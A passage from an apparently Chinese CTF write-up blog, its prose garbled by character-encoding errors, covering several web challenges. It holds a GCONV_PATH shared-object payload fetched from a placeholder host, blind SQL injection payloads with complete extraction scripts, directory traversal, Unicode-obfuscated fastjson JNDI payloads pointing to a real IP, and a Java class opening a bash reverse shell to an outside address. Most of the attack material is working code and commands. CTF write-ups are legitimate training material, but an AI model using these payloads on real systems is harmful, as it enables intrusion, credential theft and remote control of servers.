class="title">gconv</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">gconv_init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  system(<span class="string">&quot;/readflag&gt;/tmp/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨ <code>gcc payload.c -o payload.so -shared -fPIC</code> ç¼–è¯‘å‡º payload.soã€‚</p><p>æ„é€  gconv-modules å¦‚ä¸‹ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">module  PAYLOAD&#x2F;&#x2F;    INTERNAL    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;payload    2</span><br><span class="line">module  INTERNAL    PAYLOAD&#x2F;&#x2F;    ..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;payload    2</span><br></pre></td></tr></table></figure><p>å°†äºŒè€…ä¸Šä¼ åˆ°æœåŠ¡å™¨ä¸Šè·å–ç›´é“¾ï¼Œç„¶ååœ¨ä¸Šä¸€æ­¥è·å–çš„ <code>eval</code> å¤„å°†å†…å®¹ä¸‹è½½åˆ°é¶æœºä¸Šã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;execute-solution?h3x&#x3D;file_put_contents(&quot;&#x2F;tmp&#x2F;payload.so&quot;,file_get_contents(&quot;http:&#x2F;&#x2F;YOUR_HOST&#x2F;payload.so&quot;));</span><br></pre></td></tr></table></figure><p>å®Œæˆè¿™ä¸€æ­¥ä¹‹åä½¿ç”¨ <code>var_dump(scanfir(&quot;/tmp&quot;));</code> åº”è¯¥å¯ä»¥å¾—åˆ°å¦‚ä¸‹ç»“æœã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">array(4) &#123;</span><br><span class="line">[0]&#x3D;&gt;</span><br><span class="line">string(1) &quot;.&quot;</span><br><span class="line">[1]&#x3D;&gt;</span><br><span class="line">string(2) &quot;..&quot;</span><br><span class="line">[2]&#x3D;&gt;</span><br><span class="line">string(13) &quot;gconv-modules&quot;</span><br><span class="line">[3]&#x3D;&gt;</span><br><span class="line">string(10) &quot;payload.so&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ­¤æ—¶å³å¯ä½¿ç”¨å¦‚ä¸‹ payload è·å– flagã€‚ï¼ˆè¿™ä¸€æ­¥æ¯”è¾ƒçœ‹è¿æ°”æ„Ÿè§‰ï¼Œå¤šå‘äº¿åŒ…å°±èƒ½è§¦å‘æˆåŠŸäº† xï¼‰</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">...&#x2F;execute-solution?h3x&#x3D;putenv(&quot;GCONV_PATH&#x3D;&#x2F;tmp&#x2F;&quot;);file_put_contents(&quot;php:&#x2F;&#x2F;filter&#x2F;write&#x3D;convert.iconv.payload.utf-8&#x2F;resource&#x3D;&#x2F;tmp&#x2F;122&quot;,&quot;Hello!!!!!!!!!!!&quot;);</span><br><span class="line"></span><br><span class="line">...&#x2F;execute-solution?h3x&#x3D;readfile(&quot;&#x2F;tmp&#x2F;flag&quot;);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;94a14bb8-a049-43e1-af25-250d51fdae1b&#125;</span><br></pre></td></tr></table></figure><h3 id="realezjvav"><a href="#realezjvav" class="headerlink" title="realezjvav"></a>realezjvav</h3><h4 id="SQL-ç›²æ³¨"><a href="#SQL-ç›²æ³¨" class="headerlink" title="SQL ç›²æ³¨"></a>SQL ç›²æ³¨</h4><h5 id="ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥"><a href="#ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥" class="headerlink" title="ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥"></a>ç¬›å¡å°”ç§¯å»¶æ—¶æ³¨å…¥</h5><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/5505">https://xz.aliyun.com/t/5505</a></p></blockquote><p>æœ´å®æ— åçš„ç™»å½•ç•Œé¢ï¼Œä½¿ç”¨ç¬›å¡å°”ç§¯æ³¨å…¥è¯•æ¢å¯ä»¥å‘ç°å·®åˆ«ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">password<span class="operator">=</span>a<span class="string">&#x27;/**/and(select/**/if((1=1),(select/**/count(*)/**/from/**/information_schema.tables/**/A,information_schema.tables/**/B,information_schema.tables/**/C),1))#&amp;username=admin</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">password=a&#x27;</span><span class="comment">/**/</span><span class="keyword">and</span>(<span class="keyword">select</span><span class="comment">/**/</span>if((<span class="number">1</span><span class="operator">=</span><span class="number">0</span>),(<span class="keyword">select</span><span class="comment">/**/</span><span class="built_in">count</span>(<span class="operator">*</span>)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span>A,information_schema.tables<span class="comment">/**/</span>B,information_schema.tables<span class="comment">/**/</span>C),<span class="number">1</span>))#<span class="operator">&amp;</span>username<span class="operator">=</span>admin</span><br></pre></td></tr></table></figure><p>å¦‚ä¸Šçš„ä¸¤ä¸ªè½½è·åœ¨å“åº”æ—¶é—´ä¸Šå‡ºç°äº†æ¯”è¾ƒç¨³å®šçš„ä¸€ç§’é’Ÿå·¦å³çš„åå·®ï¼Œåˆ¤æ–­å­˜åœ¨ SQL æ³¨å…¥ã€‚ä¸è¿‡ç›¸å·®æ—¶é—´å¤ªçŸ­ï¼Œå°†å…¶ä¸­ä¸€ä¸ªæ”¹ä½œ <code>information_schema.columns</code> æ¥å»¶é•¿ä¸€ç‚¹æ—¶é—´ï¼Œå†™ä¸€ä¸ªè„šæœ¬æ¥çˆ†å‡ºæ‰€éœ€å†…å®¹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ENV = <span class="string">&quot;.../user/login&quot;</span></span><br><span class="line">SESSION = requests.session()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    timeSpan = <span class="number">2</span></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            mid = <span class="built_in">int</span>((low + high) / <span class="number">2</span>)</span><br><span class="line">            content = <span class="string">&quot;select/**/database()&quot;</span></span><br><span class="line">            sql = <span class="string">f&quot;null&#x27;/**/and(select/**/if((ascii(substr((<span class="subst">&#123;content&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>),(select/**/count(&quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;*)/**/from/**/information_schema.tables/**/A,information_schema.tables/**/B,&quot;</span> \</span><br><span class="line">                  <span class="string">f&quot;information_schema.columns/**/C),1))# &quot;</span></span><br><span class="line">            param = &#123;</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: sql,</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            startTime = time.time()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] POST startTime: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(startTime))</span><br><span class="line">            SESSION.post(url=ENV, data=param)</span><br><span class="line">            endTime = time.time()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] POST endTime: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(endTime))</span><br><span class="line">            <span class="keyword">if</span> endTime - startTime &gt; timeSpan:</span><br><span class="line">                high = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] After changing we got &#123;&#125; to &#123;&#125;&quot;</span>.<span class="built_in">format</span>(low, high))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Now has &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">int</span>((high + low - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Result now is: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(result))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h5 id="åˆ›é€ æ¡ä»¶çš„å¸ƒå°”ç›²æ³¨"><a href="#åˆ›é€ æ¡ä»¶çš„å¸ƒå°”ç›²æ³¨" class="headerlink" title="åˆ›é€ æ¡ä»¶çš„å¸ƒå°”ç›²æ³¨"></a>åˆ›é€ æ¡ä»¶çš„å¸ƒå°”ç›²æ³¨</h5><p>é€šè¿‡å°è¯•å‘ç°ï¼Œå½“ SQL è¯­å¥æŠ¥é”™çš„æ—¶å€™é¡µé¢ä¹Ÿä¼šæŠ¥ 500 çš„é”™è¯¯ï¼Œå› æ­¤å¯ä»¥æ‰‹åŠ¨æ„é€ ä¸€ä¸ªè¯­å¥ä»¤ç»“æœä¸ºçœŸæˆ–å‡æ—¶æŠ¥é”™ã€‚è¿™é‡Œä»¥ <code>cot(0)</code> ä¸ºä¾‹å­ã€‚</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">1</span>,cot(<span class="number">0</span>),<span class="number">0</span>) ;</span><br><span class="line">ERROR <span class="number">1690</span> (<span class="number">22003</span>): <span class="keyword">DOUBLE</span> <span class="keyword">value</span> <span class="keyword">is</span> <span class="keyword">out</span> <span class="keyword">of</span> <span class="keyword">range</span> <span class="keyword">in</span> <span class="string">&#x27;cot(0)&#x27;</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">0</span>,cot(<span class="number">0</span>),<span class="number">0</span>) ;</span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span> if(<span class="number">1</span><span class="operator">=</span><span class="number">0</span>,cot(<span class="number">0</span>),<span class="number">0</span>) <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="operator">|</span>                <span class="number">0</span> <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å¯ä»¥äººä¸ºåœ°å°†çœŸæˆ–å‡åŒºåˆ†å¼€æ¥ï¼Œä»è€Œå®ç° SQL æ³¨å…¥ã€‚åŒç†ï¼Œä½¿ç”¨ <code>exp(9999999999,9999999999)</code> è¿™æ ·çš„è¡¨è¾¾å¼ä¹Ÿèƒ½å®ç°ç›¸åŒæ•ˆæœã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">ENV = <span class="string">&quot;.../user/login&quot;</span></span><br><span class="line">SESSION = requests.session()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line"></span><br><span class="line">    result = <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        low = <span class="number">32</span></span><br><span class="line">        high = <span class="number">128</span></span><br><span class="line">        <span class="keyword">while</span> low &lt; high:</span><br><span class="line">            mid = <span class="built_in">int</span>((low + high) / <span class="number">2</span>)</span><br><span class="line">            <span class="comment"># content = &quot;select/**/database()&quot;  #ctf</span></span><br><span class="line">            <span class="comment"># content = &quot;select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()&quot;  #user</span></span><br><span class="line">            <span class="comment"># content = &quot;select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()&quot;  #id,username,password</span></span><br><span class="line">            content = <span class="string">&quot;select/**/group_concat(password)/**/from/**/user&quot;</span>  <span class="comment">#no_0ne_kn0w_th1s</span></span><br><span class="line">            sql = <span class="string">f&quot;null&#x27; or if((ascii(substr((<span class="subst">&#123;content&#125;</span>),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;mid&#125;</span>),1,cot(0))#&quot;</span></span><br><span class="line">            param = &#123;</span><br><span class="line">                <span class="string">&quot;password&quot;</span>: sql,</span><br><span class="line">                <span class="string">&quot;username&quot;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">            &#125;</span><br><span class="line">            response = SESSION.post(url=ENV, data=param)</span><br><span class="line">            <span class="keyword">if</span> response.status_code == <span class="number">200</span>:</span><br><span class="line">                high = mid</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                low = mid + <span class="number">1</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] After changing we got &#123;&#125; to &#123;&#125;&quot;</span>.<span class="built_in">format</span>(low, high))</span><br><span class="line">        <span class="keyword">if</span> low == high == <span class="number">32</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[*] Result is: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(result))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Now has &#123;&#125;&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">        result += <span class="built_in">chr</span>(<span class="built_in">int</span>((high + low - <span class="number">1</span>) / <span class="number">2</span>))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Result now is: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(result))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>æœ€ç»ˆå¯ä»¥å¾—åˆ°ç™»å½•å¯†ç ä¸º <code>no_0ne_kn0w_th1s</code>ã€‚</p><h4 id="æ–‡ä»¶è¯»å–-1"><a href="#æ–‡ä»¶è¯»å–-1" class="headerlink" title="æ–‡ä»¶è¯»å–"></a>æ–‡ä»¶è¯»å–</h4><p>ç™»å½• admin ä¹‹åå¯ä»¥æ¥åˆ°é€‰å¤´åƒçš„é¡µé¢ï¼Œåœ¨é¡µé¢æºç é‡Œå¯ä»¥å‘ç°å¦‚ä¸‹å†…å®¹ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&quot;#roleImg&quot;).html(&#x27;<span class="tag">&lt;<span class="name">img</span> <span class="attr">style</span>=<span class="string">&quot;width:180px;height:180px&quot;</span> <span class="attr">src</span>=<span class="string">&quot;/searchimage?img=&#x27;+resObj.number +&#x27;.png&quot;</span>/&gt;</span>&#x27;)z</span><br></pre></td></tr></table></figure><p>å°è¯•å¯¹è¿™ä¸ªè·¯ç”±ä½¿ç”¨ç›®å½•ç©¿è¶Šè¯»å–æ–‡ä»¶çš„å¥—è·¯ï¼Œå¯ä»¥è¯»å–åˆ° pom.xmlã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;searchimage?img&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;pom.xml</span><br></pre></td></tr></table></figure><p>åœ¨ pom.xml ç§å¯ä»¥å‘ç°å¦‚ä¸‹å…³é”®ä¾èµ–ï¼Œç‰ˆæœ¬ä¸º 1.2.27 &lt; 1.2.47ã€‚äºæ˜¯è€ƒè™‘ä½¿ç”¨ fastjson è¿›è¡Œ RCEã€‚</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.27<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="fastjson-exploit"><a href="#fastjson-exploit" class="headerlink" title="fastjson exploit"></a>fastjson exploit</h4><p>æŒ‰ç½‘ç«™çš„ä¸šåŠ¡é€»è¾‘æ“ä½œä¸€æ¬¡å¯ä»¥å‘ç° <code>.../create</code> è·¯ç”±ä¼ å…¥çš„æ˜¯ jsonï¼Œäºæ˜¯å°è¯•å°†å…¶ä½œä¸ºåˆ©ç”¨ç‚¹ã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615983599850/c391551282ba2edfe4c7587420866c5fc162dabf.png"></p><p>ä½¿ç”¨å¸¸ç”¨çš„ payload æ‰“ä¸€å‘ï¼Œå¯ä»¥å‘ç°éœ€è¦ bypassã€‚</p><p><img src="https://api.lemonprefect.cn/image/hdslb/archive/80b57343-392a-5c52-a3d5-afc64a4b587b/1615985217182/cabdab1347ad4556533fe8435eb57d93c92f45e5.png"></p><p>å°è¯•å°† payload çš„ä¸€éƒ¨åˆ†å­—ç¬¦ä½¿ç”¨ Unicode ç¼–ç ä»¥ç»•è¿‡å…³é”®å­—çš„è¿‡æ»¤ã€‚å¾—åˆ°å¦‚ä¸‹çš„ payloadã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;\u006E\u0061\u006D\u0065&quot;</span>:&#123;<span class="attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span>:<span class="string">&quot;\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0043\u006C\u0061\u0073\u0073&quot;</span>,<span class="attr">&quot;\u0076\u0061\u006C&quot;</span>:<span class="string">&quot;\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C&quot;</span>&#125;,<span class="attr">&quot;x&quot;</span>:&#123;<span class="attr">&quot;\u0040\u0074\u0079\u0070\u0065&quot;</span>:<span class="string">&quot;\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C&quot;</span>,<span class="attr">&quot;dataSourceName&quot;</span>:<span class="string">&quot;\u006C\u0064\u0061\u0070\u003A\u002F\u002F\u0038\u002E\u0031\u0033\u0036\u002E\u0038\u002E\u0032\u0031\u0030\u003A\u0031\u0033\u0038\u0039\u002F\u0045\u0078\u0070\u006C\u006F\u0069\u0074&quot;</span>,<span class="attr">&quot;\u0061\u0075\u0074\u006F\u0043\u006F\u006D\u006D\u0069\u0074&quot;</span>:<span class="literal">true</span>&#125;&#125;</span><br></pre></td></tr></table></figure><blockquote><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/zpchcbd/p/11697706.html">https://www.cnblogs.com/zpchcbd/p/11697706.html</a></p></blockquote><p>åœ¨æœåŠ¡å™¨ä¸Šç¼–è¯‘å¥½å¦‚ä¸‹ Exploitã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;/bin/bash -c $@|bash 0 echo bash -i &gt;&amp;/dev/tcp/8.136.8.210/3255 0&gt;&amp;1&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span></span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†å¼€å¯ HTTP Server å’Œ LDAP Serverï¼ŒåŒæ—¶ä½¿ç”¨ä¸€ä¸ª Netcat ç›‘å¬åå¼¹å›æ¥çš„ shellã€‚æ­¤æ—¶å°†æ„é€ å¥½çš„ payload è¯·æ±‚å‘é€å‡ºå»ï¼Œå³å¯åœ¨ Netcat ç›‘å¬å¤„è·å¾— shellã€‚<code>cat /flag_no_one_know_abccba.txt</code> å³å¯å¾— flagã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;20761f89-9ed6-444a-b4ba-2c717ca99e23&#125;</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨å¦‚ä¸‹çš„ payload äº¦å¯è¾¾æˆç›®çš„ã€‚</p><figure class="highlight plain"><figcaption><span>text</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;\u0040\u0074\u0079\u0070\u0065&quot;:&quot;\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C&quot;,&quot;dataSourceName&quot;:&quot;\u006C\u0064\u0061\u0070\u003A\u002F\u002F\u0038\u002E\u0031\u0033\u0036\u002E\u0038\u002E\u0032\u0031\u0030\u003A\u0031\u0033\u0038\u0039\u002F\u0045\u0078\u0070\u006C\u006F\u0069\u0074&quot;,&quot;\u0061\u0075\u0074\u006F\u0043\u006F\u006D\u006D\u0069\u0074&quot;:true&#125;</span><br></pre></td></tr></table></figure><p>ç›¸å…³éƒ¨åˆ†çš„æºç å¦‚ä¸‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* IndexController.java */</span></span><br><span class="line"><span class="keyword">package</span> com.example.springbootdemo.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSONObject;</span><br><span class="line"><span class="keyword">import</span> com.example.springbootdemo.Util.FileUtil;</span><br><span class="line"><span class="keyword">import</span> com.example.springbootdemo.entity.Sorcerer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.http.MediaType;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.imageio.ImageIO;</span><br><span class="line"><span class="keyword">import</span> java.awt.image.BufferedImage;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">* @author no_one_know</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/index&quot;)</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">sayHello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span 